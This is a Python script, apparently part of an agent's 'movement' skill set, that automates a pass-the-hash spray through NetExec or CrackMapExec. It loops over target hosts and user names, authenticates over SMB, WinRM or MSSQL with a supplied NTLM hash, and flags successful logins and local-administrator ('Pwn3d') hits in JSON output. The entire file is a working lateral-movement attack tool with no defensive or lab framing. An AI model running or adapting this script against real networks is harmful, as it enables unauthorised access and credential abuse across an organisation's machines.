#!/usr/bin/env python3
"""Run pass-the-hash spray across targets using NetExec/CrackMapExec.

Usage:
  python skills/movement/scripts/pth_spray.py -d corp.local -u alice -H <NTLM> --targets-file hosts.txt --protocol smb
"""

from __future__ import annotations

import argparse
import json
import shutil
import subprocess
from pathlib import Path


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Pass-the-hash spray helper.")
    parser.add_argument("-d", "--domain", required=True)
    users = parser.add_mutually_exclusive_group(required=True)
    users.add_argument("-u", "--user")
    users.add_argument("-U", "--users-file")
    parser.add_argument("-H", "--hash", dest="nt_hash", required=True)
    targets = parser.add_mutually_exclusive_group(required=True)
    targets.add_argument("--target")
    targets.add_argument("--targets-file")
    parser.add_argument("--protocol", choices=["smb", "winrm", "mssql"], default="smb")
    parser.add_argument("--local-auth", action="store_true")
    return parser.parse_args()


def read_lines(path: str) -> list[str]:
    return [
        line.strip()
        for line in Path(path).read_text(encoding="utf-8").splitlines()
        if line.strip()
    ]


def main() -> int:
    args = parse_args()
    tool = shutil.which("netexec") or shutil.which("crackmapexec")
    users = [args.user] if args.user else read_lines(args.users_file)
    targets = [args.target] if args.target else read_lines(args.targets_file)

    all_runs: list[dict[str, object]] = []
    success: list[dict[str, str]] = []
    local_admin_hits: list[dict[str, str]] = []
    fail_count = 0

    for target in targets:
        for user in users:
            command = [
                tool or "netexec",
                args.protocol,
                target,
                "-d",
                args.domain,
                "-u",
                user,
                "-H",
                args.nt_hash,
            ]
            if args.local_auth:
                command.append("--local-auth")

            run_info: dict[str, object] = {
                "target": target,
                "user": user,
                "command": command,
            }
            if not tool:
                run_info["tool_found"] = False
                all_runs.append(run_info)
                continue

            result = subprocess.run(
                command, capture_output=True, text=True, check=False
            )
            text = f"{result.stdout}\n{result.stderr}".lower()
            run_info["return_code"] = result.returncode
            run_info["tool_found"] = True
            all_runs.append(run_info)
            if "[+]" in text or "pwned" in text:
                success.append({"target": target, "user": user})
                if "(pwn3d)" in text or "pwn3d" in text:
                    local_admin_hits.append({"target": target, "user": user})
            else:
                fail_count += 1

    payload = {
        "tool": tool or "netexec",
        "tool_found": bool(tool),
        "protocol": args.protocol,
        "attempts": len(targets) * len(users),
        "success": success,
        "failure_count": fail_count,
        "local_admin_hits": local_admin_hits,
        "runs": all_runs,
    }
    print(json.dumps(payload, indent=2, ensure_ascii=False))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
